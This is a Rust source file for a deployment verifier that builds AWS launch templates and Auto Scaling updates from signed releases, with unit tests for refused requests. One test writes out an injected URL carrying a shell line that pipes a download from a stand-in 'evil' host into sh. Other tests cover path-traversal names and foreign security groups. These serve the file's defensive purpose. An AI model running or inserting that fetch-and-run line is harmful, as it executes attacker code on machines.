//! Machines on protected installs: the verifier is the only principal that
//! decides what a machine boots.
//!
//! On AWS it writes the launch template version, the Auto Scaling group's
//! template and bounds, and starts the instance refresh; management keeps
//! only `SetDesiredCapacity` and terminate, and AWS holds desired capacity
//! within the signed bounds. On GCP and Azure management writes no compute
//! at all and asks the verifier to resize, which clamps to the signed
//! bounds.
//!
//! Everything a machine boots with comes from the signed stack or from the
//! verifier: the instance type, disks, the image (whose owner must be the
//! publisher compiled into this build), the instance profile and network
//! setup created for the cluster, and user-data the verifier writes from
//! typed fields.

use alien_aws_clients::autoscaling::{
    AutoScalingApi, CreateAutoScalingGroupRequest, DescribeAutoScalingGroupsRequest,
    LaunchTemplateSpecification, StartInstanceRefreshRequest, UpdateAutoScalingGroupRequest,
};
use alien_aws_clients::ec2::{
    CreateLaunchTemplateRequest, CreateLaunchTemplateVersionRequest, DescribeImagesRequest,
    DescribeLaunchTemplatesRequest, Ec2Api, LaunchTemplateBlockDeviceMapping,
    LaunchTemplateCpuOptions, LaunchTemplateEbsBlockDevice,
    LaunchTemplateIamInstanceProfileSpecification, LaunchTemplateInstanceMetadataOptions,
    RequestLaunchTemplateData,
};
use alien_client_core::ErrorData as CloudClientErrorData;
use alien_core::release_statement::signed_stack;
use alien_core::{CapacityGroup, ComputeCluster, Platform};
use alien_error::{AlienError, Context, IntoAlienError};
use alien_signing::{Kind, ReleaseBody, SignedStatement};
use async_trait::async_trait;
use base64::Engine as _;
use serde::{Deserialize, Serialize};

use crate::error::{ErrorData, Result};
use crate::plan::Place;

/// Roll one capacity group of a machine cluster to the signed release (AWS).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct RollMachines {
    /// Compute cluster resource id in the signed stack.
    pub cluster: String,
    /// Capacity group id in that cluster.
    pub group: String,
    /// The release, as the vendor signed it.
    pub release: SignedStatement,
    /// The signer list chain, from version 1.
    pub signer_lists: Vec<SignedStatement>,
    /// This install's config, if any.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub config: Option<SignedStatement>,
    /// AMI to boot. Its owner must be the publisher this build names.
    pub machine_image: String,
    /// Instance type, when the signed group leaves it to the install. When
    /// the signed group names one, this must be it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub instance_type: Option<String>,
    /// `https://` URL of the machine control plane the agent connects to.
    /// It comes from the caller: a machine checks every release and config
    /// signature itself, so a wrong URL can only keep machines from work.
    pub api_url: String,
    /// The security groups the caller expects. The verifier uses the ones
    /// setup created for machines; these, if given, must be exactly those.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub security_group_ids: Option<Vec<String>>,
    /// The subnets the caller expects, checked the same way.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub subnet_ids: Option<Vec<String>>,
}

/// Resize one machine group within its signed bounds (GCP MIG, Azure VMSS).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct Scale {
    /// Compute cluster resource id in the signed stack.
    pub cluster: String,
    /// Capacity group id in that cluster. The verifier resizes the MIG or
    /// VMSS `<prefix>-<cluster>-<group>`; the caller never names it.
    pub group: String,
    /// GCP zone of a zonal MIG, in the verifier's region; absent for a
    /// regional one, and on Azure.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub zone: Option<String>,
    /// Machines the control plane wants.
    pub desired: u32,
    /// The release whose stack holds the bounds.
    pub release: SignedStatement,
    /// The signer list chain, from version 1.
    pub signer_lists: Vec<SignedStatement>,
}

/// The typed user-data a protected machine boots with. The machine agent
/// reads only these fields; it never runs user-data as a script.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct MachineUserData {
    /// The machine agent's settings.
    pub machine_agent: MachineAgentUserData,
}

/// What the machine agent takes from user-data.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct MachineAgentUserData {
    /// Machine control plane URL.
    pub api_url: String,
    /// Digest of the machine agent build the release runs with.
    pub digest: String,
}

fn refused(reason: impl Into<String>) -> AlienError<ErrorData> {
    AlienError::new(ErrorData::Refused {
        reason: reason.into(),
    })
}

/// The capacity group `group` of cluster `cluster` in the signed stack of `release`.
pub fn signed_group(release: &ReleaseBody, cluster: &str, group: &str) -> Result<CapacityGroup> {
    let platform: Platform = release
        .platform
        .parse()
        .map_err(|_| refused(format!("platform '{}' is not known", release.platform)))?;
    let stack = signed_stack(release, platform).context(ErrorData::Refused {
        reason: "the release carries no usable stack".to_string(),
    })?;
    let entry = stack
        .resources()
        .find(|(id, _)| id.as_str() == cluster)
        .map(|(_, entry)| entry)
        .ok_or_else(|| refused(format!("the signed stack has no resource '{cluster}'")))?;
    let cluster_config = entry
        .config
        .downcast_ref::<ComputeCluster>()
        .ok_or_else(|| refused(format!("resource '{cluster}' is not a compute cluster")))?;
    cluster_config
        .capacity_groups
        .iter()
        .find(|candidate| candidate.group_id == group)
        .cloned()
        .ok_or_else(|| {
            refused(format!(
                "compute cluster '{cluster}' has no capacity group '{group}'"
            ))
        })
}

/// Whether `text` may be one dash-separated part of a cloud resource name:
/// letters, digits and dashes only, so it can't leave its URL path segment.
fn is_name_part(text: &str) -> bool {
    !text.is_empty()
        && text.len() <= 63
        && text
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
}

/// The MIG or VMSS a `scale` request resizes: `<prefix>-<cluster>-<group>`,
/// built here from the install's prefix and the signed ids.
pub fn scale_target(prefix: &str, cluster: &str, group: &str) -> Result<String> {
    for part in [prefix, cluster, group] {
        if !is_name_part(part) {
            return Err(refused(format!(
                "'{part}' may not be part of a machine group name"
            )));
        }
    }
    Ok(format!("{prefix}-{cluster}-{group}"))
}

/// Refuse a GCP zone that is not a zone of `region`, the verifier's own.
pub fn check_zone(zone: &str, region: &str) -> Result<()> {
    let in_region = zone.rsplit_once('-').is_some_and(|(zone_region, letter)| {
        zone_region == region
            && letter.len() == 1
            && letter.bytes().all(|byte| byte.is_ascii_lowercase())
    });
    let region_ok = region.split_once('-').is_some_and(|(area, rest)| {
        let digits = rest.trim_start_matches(|c: char| c.is_ascii_lowercase());
        !area.is_empty()
            && area.bytes().all(|byte| byte.is_ascii_lowercase())
            && digits.len() < rest.len()
            && !digits.is_empty()
            && digits.bytes().all(|byte| byte.is_ascii_digit())
    });
    if in_region && region_ok {
        Ok(())
    } else {
        Err(refused(format!(
            "'{zone}' is not a zone of the verifier's region {region}"
        )))
    }
}

/// `base` with `segments` appended, each percent-encoded as one path
/// segment. Callers check segments with [`is_name_part`] first: the URL
/// library drops `.` and `..` segments rather than encoding them.
pub(crate) fn segments_url(base: &str, segments: &[&str]) -> Result<reqwest::Url> {
    let mut url =
        reqwest::Url::parse(base)
            .into_alien_error()
            .context(ErrorData::ConfigurationInvalid {
                message: format!("'{base}' is not a URL"),
            })?;
    url.path_segments_mut()
        .map_err(|()| {
            AlienError::new(ErrorData::ConfigurationInvalid {
                message: format!("'{base}' can't take path segments"),
            })
        })?
        .extend(segments);
    Ok(url)
}

/// Desired capacity within the signed bounds.
pub fn clamp(desired: u32, group: &CapacityGroup) -> u32 {
    desired.clamp(group.min_size, group.max_size.max(group.min_size))
}

/// The launch template data, group bounds and names for a roll.
#[derive(Debug, Clone)]
pub struct RollPlan {
    /// `<prefix>-<cluster>-<group>-lt`.
    pub template_name: String,
    /// `<prefix>-<cluster>-<group>`.
    pub group_name: String,
    /// What every new machine boots with.
    pub data: RequestLaunchTemplateData,
    /// Signed minimum.
    pub min_size: i32,
    /// Signed maximum.
    pub max_size: i32,
    /// Subnets, for a group the verifier creates.
    pub subnet_ids: Vec<String>,
}

/// What the verifier learned about the image: its owner and architecture.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ImageFacts {
    /// Account that owns it.
    pub owner: String,
    /// `x86_64` or `arm64`.
    pub architecture: String,
}

fn is_id(text: &str, prefix: &str) -> bool {
    text.strip_prefix(prefix).is_some_and(|rest| {
        (8..=17).contains(&rest.len()) && rest.bytes().all(|byte| byte.is_ascii_hexdigit())
    })
}

fn is_api_url(url: &str) -> bool {
    url.strip_prefix("https://").is_some_and(|rest| {
        !rest.is_empty()
            && rest.len() < 512
            && rest.bytes().all(|byte| {
                byte.is_ascii_alphanumeric() || b"-._~:/?#[]@!$&'()*+,;=%".contains(&byte)
            })
            && !rest.contains(['\'', '\\'])
    })
}

/// Refuse ids the caller expects that are not exactly the ones setup created.
fn check_setup_ids(what: &str, asked: Option<&[String]>, setup: &[String]) -> Result<()> {
    let Some(asked) = asked else {
        return Ok(());
    };
    if let Some(foreign) = asked.iter().find(|id| !setup.contains(id)) {
        return Err(refused(format!(
            "{what} {foreign} is not one setup created for this install's machines"
        )));
    }
    if let Some(missing) = setup.iter().find(|id| !asked.contains(id)) {
        return Err(refused(format!(
            "the {what}s asked for leave out {missing}, which setup created for this install's machines"
        )));
    }
    Ok(())
}

/// Build the launch template for a roll. `publisher` is the account whose
/// images this build boots; `image` is what the verifier read about the
/// requested image.
pub fn plan_roll(
    place: &Place,
    release: &ReleaseBody,
    request: &RollMachines,
    publisher: Option<&str>,
    image: &ImageFacts,
) -> Result<RollPlan> {
    let publisher = publisher.ok_or_else(|| {
        refused("this verifier build names no machine-image publisher, so it launches no machines")
    })?;
    if !is_id(&request.machine_image, "ami-") {
        return Err(refused(format!(
            "'{}' is not an AMI id",
            request.machine_image
        )));
    }
    // The caller picks the image, so it may pick any image the publisher
    // ever released, old ones included. That is an accepted limit: old
    // publisher images stay bootable. What an old image runs is still the
    // machine agent build the signed release pins below, which the image
    // downloads and checks against `digest` before starting it.
    if image.owner != publisher {
        return Err(refused(format!(
            "image {} is owned by {}, not the publisher {publisher}",
            request.machine_image, image.owner
        )));
    }
    let group = signed_group(release, &request.cluster, &request.group)?;
    let instance_type = match (&group.instance_type, &request.instance_type) {
        (Some(signed), Some(asked)) if signed != asked => {
            return Err(refused(format!(
                "instance type {asked} is not the signed {signed}"
            )))
        }
        (Some(signed), _) => signed.clone(),
        (None, Some(asked)) => asked.clone(),
        (None, None) => return Err(refused("no instance type was given or signed")),
    };
    let component = match image.architecture.as_str() {
        "x86_64" => "machine-agent/linux-x86_64",
        "arm64" => "machine-agent/linux-aarch64",
        other => {
            return Err(refused(format!(
                "image architecture '{other}' is not known"
            )))
        }
    };
    let digest = release.components.get(component).ok_or_else(|| {
        refused(format!(
            "the release pins no {component} build, so no machine may boot it"
        ))
    })?;
    if !is_api_url(&request.api_url) {
        return Err(refused(format!(
            "'{}' is not an https URL the verifier writes",
            request.api_url
        )));
    }
    let network = place.machine_network.as_ref().ok_or_else(|| {
        refused("setup fixed no machine network for this verifier, so it launches no machines")
    })?;
    if network.security_group_ids.is_empty()
        || !network.security_group_ids.iter().all(|id| is_id(id, "sg-"))
        || network.subnet_ids.is_empty()
        || !network.subnet_ids.iter().all(|id| is_id(id, "subnet-"))
    {
        return Err(AlienError::new(ErrorData::ConfigurationInvalid {
            message: "the machine network setup fixed is not subnet and security group ids"
                .to_string(),
        }));
    }
    check_setup_ids(
        "security group",
        request.security_group_ids.as_deref(),
        &network.security_group_ids,
    )?;
    check_setup_ids("subnet", request.subnet_ids.as_deref(), &network.subnet_ids)?;
    let user_data = MachineUserData {
        machine_agent: MachineAgentUserData {
            api_url: request.api_url.clone(),
            digest: digest.clone(),
        },
    };
    let user_data = serde_json::to_string(&user_data).map_err(|error| {
        AlienError::new(ErrorData::ConfigurationInvalid {
            message: format!("user-data does not serialize: {error}"),
        })
    })?;
    let (account, prefix) = match &place.install {
        alien_signing::InstallId::Aws {
            account, prefix, ..
        } => (account.clone(), prefix.clone()),
        _ => return Err(refused("machines roll through the verifier on AWS only")),
    };
    let base = format!("{prefix}-{}-{}", request.cluster, request.group);
    let ebs = |size: i32| LaunchTemplateEbsBlockDevice {
        volume_size: Some(size),
        volume_type: Some("gp3".to_string()),
        delete_on_termination: Some(true),
        encrypted: Some(true),
        iops: None,
        throughput: None,
    };
    let mut disks = vec![LaunchTemplateBlockDeviceMapping {
        device_name: Some("/dev/xvda".to_string()),
        ebs: Some(ebs(group.aws_root_volume_size_gib())),
    }];
    if let Some(size) = group.aws_runtime_data_volume_size_gib() {
        disks.push(LaunchTemplateBlockDeviceMapping {
            device_name: Some("/dev/xvdf".to_string()),
            ebs: Some(ebs(size)),
        });
    }
    let data = RequestLaunchTemplateData::builder()
        .image_id(request.machine_image.clone())
        .instance_type(instance_type)
        .iam_instance_profile(LaunchTemplateIamInstanceProfileSpecification {
            arn: Some(format!("arn:aws:iam::{account}:instance-profile/{base}")),
            name: None,
        })
        .user_data(base64::engine::general_purpose::STANDARD.encode(user_data))
        .security_group_ids(network.security_group_ids.clone())
        .block_device_mappings(disks)
        .metadata_options(LaunchTemplateInstanceMetadataOptions {
            http_tokens: Some("required".to_string()),
            http_endpoint: Some("enabled".to_string()),
            http_put_response_hop_limit: Some(1),
            instance_metadata_tags: Some("disabled".to_string()),
        })
        .maybe_cpu_options((group.nested_virtualization == Some(true)).then(|| {
            LaunchTemplateCpuOptions {
                nested_virtualization: Some("enabled".to_string()),
            }
        }))
        .build();
    Ok(RollPlan {
        template_name: format!("{base}-lt"),
        group_name: base,
        data,
        min_size: aws_size(group.min_size)?,
        max_size: aws_size(group.max_size)?,
        subnet_ids: network.subnet_ids.clone(),
    })
}

/// A signed group size as Auto Scaling takes it.
fn aws_size(size: u32) -> Result<i32> {
    i32::try_from(size).map_err(|_| refused(format!("the signed size {size} is too large")))
}

/// The EC2 and Auto Scaling calls a roll makes.
#[async_trait]
pub trait MachineApi: Send + Sync {
    /// The image's owner and architecture, if it exists.
    async fn image(&self, id: &str) -> Result<Option<ImageFacts>>;
    /// The id of launch template `name`, if it exists.
    async fn template(&self, name: &str) -> Result<Option<String>>;
    /// Create launch template `name` with `data` as version 1; its id.
    async fn create_template(&self, name: &str, data: &RequestLaunchTemplateData)
        -> Result<String>;
    /// Add a version to template `id`; its number.
    async fn create_version(&self, id: &str, data: &RequestLaunchTemplateData) -> Result<i64>;
    /// Whether Auto Scaling group `name` exists.
    async fn group_exists(&self, name: &str) -> Result<bool>;
    /// Create an Auto Scaling group.
    async fn create_group(&self, request: CreateAutoScalingGroupRequest) -> Result<()>;
    /// Update an Auto Scaling group.
    async fn update_group(&self, request: UpdateAutoScalingGroupRequest) -> Result<()>;
    /// Start an instance refresh; its id.
    async fn start_refresh(&self, name: &str) -> Result<String>;
}

/// What a roll did.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Rolled {
    /// Launch template id.
    pub launch_template_id: String,
    /// The version every new machine boots.
    pub version: i64,
    /// Auto Scaling group name.
    pub group: String,
    /// Instance refresh id, when the group already existed.
    pub instance_refresh_id: Option<String>,
}

/// Write the launch template version, point the group at it with the
/// signed bounds, and start replacing its machines.
pub async fn roll(api: &dyn MachineApi, plan: &RollPlan) -> Result<Rolled> {
    let (template_id, version) = match api.template(&plan.template_name).await? {
        Some(id) => {
            let version = api.create_version(&id, &plan.data).await?;
            (id, version)
        }
        None => (
            api.create_template(&plan.template_name, &plan.data).await?,
            1,
        ),
    };
    let launch_template = LaunchTemplateSpecification {
        launch_template_id: Some(template_id.clone()),
        launch_template_name: None,
        version: Some(version.to_string()),
    };
    if !api.group_exists(&plan.group_name).await? {
        if plan.subnet_ids.is_empty() {
            return Err(refused(format!(
                "group {} does not exist and no subnets were given to create it",
                plan.group_name
            )));
        }
        api.create_group(
            CreateAutoScalingGroupRequest::builder()
                .auto_scaling_group_name(plan.group_name.clone())
                .min_size(plan.min_size)
                .max_size(plan.max_size)
                .desired_capacity(plan.min_size)
                .launch_template(launch_template)
                .vpc_zone_identifier(plan.subnet_ids.join(","))
                .build(),
        )
        .await?;
        return Ok(Rolled {
            launch_template_id: template_id,
            version,
            group: plan.group_name.clone(),
            instance_refresh_id: None,
        });
    }
    api.update_group(
        UpdateAutoScalingGroupRequest::builder()
            .auto_scaling_group_name(plan.group_name.clone())
            .min_size(plan.min_size)
            .max_size(plan.max_size)
            .launch_template(launch_template)
            .build(),
    )
    .await?;
    let refresh = api.start_refresh(&plan.group_name).await?;
    Ok(Rolled {
        launch_template_id: template_id,
        version,
        group: plan.group_name.clone(),
        instance_refresh_id: Some(refresh),
    })
}

/// The real EC2 and Auto Scaling clients.
pub struct AwsMachines<E, A> {
    /// EC2.
    pub ec2: E,
    /// Auto Scaling.
    pub autoscaling: A,
}

fn failed(operation: impl Into<String>) -> ErrorData {
    ErrorData::CloudCallFailed {
        operation: operation.into(),
    }
}

#[async_trait]
impl<E: Ec2Api, A: AutoScalingApi> MachineApi for AwsMachines<E, A> {
    async fn image(&self, id: &str) -> Result<Option<ImageFacts>> {
        let response = self
            .ec2
            .describe_images(
                DescribeImagesRequest::builder()
                    .image_ids(vec![id.to_string()])
                    .build(),
            )
            .await;
        let response = match response {
            Ok(response) => response,
            Err(error)
                if matches!(
                    error.error,
                    Some(CloudClientErrorData::RemoteResourceNotFound { .. })
                ) =>
            {
                return Ok(None)
            }
            Err(error) => return Err(error).context(failed(format!("ec2:DescribeImages {id}"))),
        };
        let image = response.images_set.and_then(|set| {
            set.items
                .into_iter()
                .find(|image| image.image_id.as_deref() == Some(id))
        });
        Ok(image.map(|image| ImageFacts {
            owner: image.owner_id.unwrap_or_default(),
            architecture: image.architecture.unwrap_or_default(),
        }))
    }

    async fn template(&self, name: &str) -> Result<Option<String>> {
        let response = self
            .ec2
            .describe_launch_templates(
                DescribeLaunchTemplatesRequest::builder()
                    .launch_template_names(vec![name.to_string()])
                    .build(),
            )
            .await;
        match response {
            Ok(response) => Ok(response
                .launch_templates
                .and_then(|set| set.items.into_iter().next())
                .and_then(|template| template.launch_template_id)),
            Err(error)
                if matches!(
                    error.error,
                    Some(CloudClientErrorData::RemoteResourceNotFound { .. })
                        | Some(CloudClientErrorData::InvalidInput { .. })
                ) =>
            {
                Ok(None)
            }
            Err(error) => Err(error).context(failed(format!("ec2:DescribeLaunchTemplates {name}"))),
        }
    }

    async fn create_template(
        &self,
        name: &str,
        data: &RequestLaunchTemplateData,
    ) -> Result<String> {
        let response = self
            .ec2
            .create_launch_template(
                CreateLaunchTemplateRequest::builder()
                    .launch_template_name(name.to_string())
                    .launch_template_data(data.clone())
                    .build(),
            )
            .await
            .context(failed(format!("ec2:CreateLaunchTemplate {name}")))?;
        response
            .launch_template
            .and_then(|template| template.launch_template_id)
            .ok_or_else(|| {
                AlienError::new(failed(format!(
                    "ec2:CreateLaunchTemplate {name} returned no id"
                )))
            })
    }

    async fn create_version(&self, id: &str, data: &RequestLaunchTemplateData) -> Result<i64> {
        let response = self
            .ec2
            .create_launch_template_version(
                CreateLaunchTemplateVersionRequest::builder()
                    .launch_template_id(id.to_string())
                    .launch_template_data(data.clone())
                    .build(),
            )
            .await
            .context(failed(format!("ec2:CreateLaunchTemplateVersion {id}")))?;
        response
            .launch_template_version
            .and_then(|version| version.version_number)
            .ok_or_else(|| {
                AlienError::new(failed(format!(
                    "ec2:CreateLaunchTemplateVersion {id} returned no version"
                )))
            })
    }

    async fn group_exists(&self, name: &str) -> Result<bool> {
        let response = self
            .autoscaling
            .describe_auto_scaling_groups(
                DescribeAutoScalingGroupsRequest::builder()
                    .auto_scaling_group_names(vec![name.to_string()])
                    .build(),
            )
            .await
            .context(failed(format!(
                "autoscaling:DescribeAutoScalingGroups {name}"
            )))?;
        Ok(response
            .describe_auto_scaling_groups_result
            .auto_scaling_groups
            .is_some_and(|groups| {
                groups
                    .members
                    .iter()
                    .any(|group| group.auto_scaling_group_name.as_deref() == Some(name))
            }))
    }

    async fn create_group(&self, request: CreateAutoScalingGroupRequest) -> Result<()> {
        let name = request.auto_scaling_group_name.clone();
        self.autoscaling
            .create_auto_scaling_group(request)
            .await
            .context(failed(format!("autoscaling:CreateAutoScalingGroup {name}")))
    }

    async fn update_group(&self, request: UpdateAutoScalingGroupRequest) -> Result<()> {
        let name = request.auto_scaling_group_name.clone();
        self.autoscaling
            .update_auto_scaling_group(request)
            .await
            .context(failed(format!("autoscaling:UpdateAutoScalingGroup {name}")))
    }

    async fn start_refresh(&self, name: &str) -> Result<String> {
        let response = self
            .autoscaling
            .start_instance_refresh(
                StartInstanceRefreshRequest::builder()
                    .auto_scaling_group_name(name.to_string())
                    .strategy("Rolling".to_string())
                    .build(),
            )
            .await
            .context(failed(format!("autoscaling:StartInstanceRefresh {name}")))?;
        response
            .start_instance_refresh_result
            .instance_refresh_id
            .ok_or_else(|| {
                AlienError::new(failed(format!(
                    "autoscaling:StartInstanceRefresh {name} returned no id"
                )))
            })
    }
}

/// Check that `release` is no older than the install's ledger allows, for
/// requests that read bounds from it without raising the floor.
pub fn check_floor(ledger: &alien_signing::Ledger, sequence: u64, digest: &str) -> Result<()> {
    ledger
        .check(Kind::Release, sequence, digest)
        .context(ErrorData::Refused {
            reason: "the release is older than one this install accepted".to_string(),
        })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fixtures::*;
    use crate::plan::SetupNetwork;
    use alien_core::release_statement::{release_body, ReleaseOptions};
    use alien_core::{ResourceLifecycle, Stack};
    use alien_signing::InstallId;
    use std::sync::Mutex;

    const PUBLISHER: &str = "345678901234";
    const SUBNET: &str = "subnet-0123456789abcdef0";
    const SECURITY_GROUP: &str = "sg-0123456789abcdef0";
    const AGENT: &str = "sha256:2222222222222222222222222222222222222222222222222222222222222222";

    fn place() -> Place {
        Place {
            install: InstallId::Aws {
                account: ACCOUNT.to_string(),
                region: REGION.to_string(),
                prefix: PREFIX.to_string(),
            },
            prefix: PREFIX.to_string(),
            vpc: None,
            machine_network: Some(SetupNetwork {
                subnet_ids: vec![SUBNET.to_string()],
                security_group_ids: vec![SECURITY_GROUP.to_string()],
            }),
        }
    }

    fn group(instance_type: Option<&str>) -> CapacityGroup {
        CapacityGroup {
            group_id: "general".to_string(),
            instance_type: instance_type.map(str::to_string),
            profile: None,
            min_size: 1,
            max_size: 4,
            scale_policy: None,
            nested_virtualization: None,
            data_disk_gib_range: None,
        }
    }

    fn signed(group: CapacityGroup, components: &[(&str, &str)]) -> ReleaseBody {
        let stack = Stack::new("shop".to_string())
            .add(
                ComputeCluster::new("compute".to_string())
                    .capacity_group(group)
                    .build(),
                ResourceLifecycle::Frozen,
            )
            .build();
        release_body(
            Platform::Aws,
            &stack,
            &ReleaseOptions {
                channel: CHANNEL.to_string(),
                components: components
                    .iter()
                    .map(|(name, digest)| (name.to_string(), digest.to_string()))
                    .collect(),
                ..Default::default()
            },
        )
        .unwrap()
    }

    fn release() -> ReleaseBody {
        signed(
            group(Some("m7g.large")),
            &[("machine-agent/linux-aarch64", AGENT)],
        )
    }

    fn request() -> RollMachines {
        RollMachines {
            cluster: "compute".to_string(),
            group: "general".to_string(),
            release: signed_release(1, &release()),
            signer_lists: vec![signer_list()],
            config: None,
            machine_image: "ami-0123456789abcdef0".to_string(),
            instance_type: None,
            api_url: "https://machines.example.com".to_string(),
            security_group_ids: None,
            subnet_ids: None,
        }
    }

    fn arm_image(owner: &str) -> ImageFacts {
        ImageFacts {
            owner: owner.to_string(),
            architecture: "arm64".to_string(),
        }
    }

    fn reason(result: Result<RollPlan>) -> String {
        crate::describe(&result.expect_err("the roll must be refused"))
    }

    #[test]
    fn the_launch_template_comes_from_the_signed_group() {
        let plan = plan_roll(
            &place(),
            &release(),
            &request(),
            Some(PUBLISHER),
            &arm_image(PUBLISHER),
        )
        .unwrap();
        assert_eq!(plan.template_name, "acme-prod-compute-general-lt");
        assert_eq!(plan.group_name, "acme-prod-compute-general");
        assert_eq!((plan.min_size, plan.max_size), (1, 4));
        assert_eq!(plan.data.instance_type.as_deref(), Some("m7g.large"));
        assert_eq!(plan.data.image_id.as_deref(), Some("ami-0123456789abcdef0"));
        assert_eq!(
            plan.data
                .iam_instance_profile
                .as_ref()
                .and_then(|profile| profile.arn.as_deref()),
            Some("arn:aws:iam::111122223333:instance-profile/acme-prod-compute-general")
        );
        assert_eq!(
            plan.data
                .metadata_options
                .as_ref()
                .and_then(|options| options.http_tokens.as_deref()),
            Some("required")
        );
        assert!(plan.data.key_name.is_none() && plan.data.network_interfaces.is_none());
        let user_data = base64::engine::general_purpose::STANDARD
            .decode(plan.data.user_data.as_deref().unwrap())
            .unwrap();
        let user_data: MachineUserData = serde_json::from_slice(&user_data).unwrap();
        assert_eq!(
            user_data,
            MachineUserData {
                machine_agent: MachineAgentUserData {
                    api_url: "https://machines.example.com".to_string(),
                    digest: AGENT.to_string(),
                }
            }
        );
    }

    #[test]
    fn only_publisher_images_boot() {
        assert!(reason(plan_roll(
            &place(),
            &release(),
            &request(),
            Some(PUBLISHER),
            &arm_image("999988887777"),
        ))
        .contains("not the publisher 345678901234"));
        assert!(reason(plan_roll(
            &place(),
            &release(),
            &request(),
            None,
            &arm_image(PUBLISHER)
        ))
        .contains("names no machine-image publisher"));
        let mut snapshot = request();
        snapshot.machine_image = "snap-0123456789abcdef0".to_string();
        assert!(reason(plan_roll(
            &place(),
            &release(),
            &snapshot,
            Some(PUBLISHER),
            &arm_image(PUBLISHER),
        ))
        .contains("not an AMI id"));
    }

    #[test]
    fn values_beside_the_signed_group_are_checked() {
        let mut other_type = request();
        other_type.instance_type = Some("p5.48xlarge".to_string());
        assert!(reason(plan_roll(
            &place(),
            &release(),
            &other_type,
            Some(PUBLISHER),
            &arm_image(PUBLISHER),
        ))
        .contains("not the signed m7g.large"));

        // A script hidden in the URL can't reach user-data.
        let mut script = request();
        script.api_url = "https://x.example.com\n#!/bin/sh\ncurl evil|sh".to_string();
        assert!(reason(plan_roll(
            &place(),
            &release(),
            &script,
            Some(PUBLISHER),
            &arm_image(PUBLISHER)
        ))
        .contains("not an https URL"));

        let mut other_group = request();
        other_group.group = "gpu".to_string();
        assert!(reason(plan_roll(
            &place(),
            &release(),
            &other_group,
            Some(PUBLISHER),
            &arm_image(PUBLISHER),
        ))
        .contains("no capacity group 'gpu'"));
    }

    #[test]
    fn machines_join_only_the_network_setup_created() {
        let roll = |place: &Place, request: &RollMachines| {
            plan_roll(
                place,
                &release(),
                request,
                Some(PUBLISHER),
                &arm_image(PUBLISHER),
            )
        };
        let plan = roll(&place(), &request()).unwrap();
        assert_eq!(
            plan.data.security_group_ids,
            Some(vec![SECURITY_GROUP.to_string()])
        );
        assert_eq!(plan.subnet_ids, vec![SUBNET.to_string()]);

        // The caller may name setup's ids; that changes nothing.
        let mut same = request();
        same.security_group_ids = Some(vec![SECURITY_GROUP.to_string()]);
        same.subnet_ids = Some(vec![SUBNET.to_string()]);
        let plan = roll(&place(), &same).unwrap();
        assert_eq!(
            plan.data.security_group_ids,
            Some(vec![SECURITY_GROUP.to_string()])
        );
        assert_eq!(plan.subnet_ids, vec![SUBNET.to_string()]);

        // Attack: a security group management created, open to the world.
        let mut open_group = request();
        open_group.security_group_ids = Some(vec![
            SECURITY_GROUP.to_string(),
            "sg-0fffffffffffffff0".to_string(),
        ]);
        assert_eq!(
            reason(roll(&place(), &open_group)),
            "Refused: security group sg-0fffffffffffffff0 is not one setup created for this install's machines"
        );

        // Attack: a public subnet in place of setup's private one.
        let mut public = request();
        public.subnet_ids = Some(vec!["subnet-0eeeeeeeeeeeeeee0".to_string()]);
        assert_eq!(
            reason(roll(&place(), &public)),
            "Refused: subnet subnet-0eeeeeeeeeeeeeee0 is not one setup created for this install's machines"
        );

        let mut fewer = request();
        fewer.security_group_ids = Some(Vec::new());
        assert_eq!(
            reason(roll(&place(), &fewer)),
            format!("Refused: the security groups asked for leave out {SECURITY_GROUP}, which setup created for this install's machines")
        );

        let unset = Place {
            machine_network: None,
            ..place()
        };
        assert_eq!(
            reason(roll(&unset, &request())),
            "Refused: setup fixed no machine network for this verifier, so it launches no machines"
        );
    }

    #[test]
    fn a_release_without_the_machine_agent_build_boots_nothing() {
        let unpinned = signed(
            group(Some("m7g.large")),
            &[("machine-agent/linux-x86_64", AGENT)],
        );
        assert!(reason(plan_roll(
            &place(),
            &unpinned,
            &request(),
            Some(PUBLISHER),
            &arm_image(PUBLISHER),
        ))
        .contains("pins no machine-agent/linux-aarch64 build"));
    }

    #[test]
    fn the_scale_target_is_built_from_names_that_stay_in_one_path_segment() {
        assert_eq!(
            scale_target(PREFIX, "compute", "general").unwrap(),
            "acme-prod-compute-general"
        );
        for (cluster, group) in [
            ("compute", "../big"),
            ("compute/x", "general"),
            ("compute", "a?b"),
            ("compute", ""),
        ] {
            let error = scale_target(PREFIX, cluster, group).expect_err(group);
            assert!(error
                .message
                .contains("may not be part of a machine group name"));
        }
    }

    #[test]
    fn scaling_stays_within_the_signed_bounds() {
        let group = group(None);
        assert_eq!(clamp(0, &group), 1);
        assert_eq!(clamp(3, &group), 3);
        assert_eq!(clamp(50, &group), 4);
    }

    /// Records each call the way AWS receives it.
    #[derive(Default)]
    struct Recorded {
        template: Option<String>,
        group_exists: bool,
        calls: Mutex<Vec<String>>,
    }

    impl Recorded {
        fn call(&self, call: String) {
            self.calls.lock().unwrap().push(call);
        }
    }

    #[async_trait]
    impl MachineApi for Recorded {
        async fn image(&self, _id: &str) -> Result<Option<ImageFacts>> {
            Ok(Some(arm_image(PUBLISHER)))
        }
        async fn template(&self, _name: &str) -> Result<Option<String>> {
            Ok(self.template.clone())
        }
        async fn create_template(
            &self,
            name: &str,
            data: &RequestLaunchTemplateData,
        ) -> Result<String> {
            self.call(format!(
                "CreateLaunchTemplate {name} {}",
                data.image_id.clone().unwrap()
            ));
            Ok("lt-0aaaaaaaaaaaaaaaa".to_string())
        }
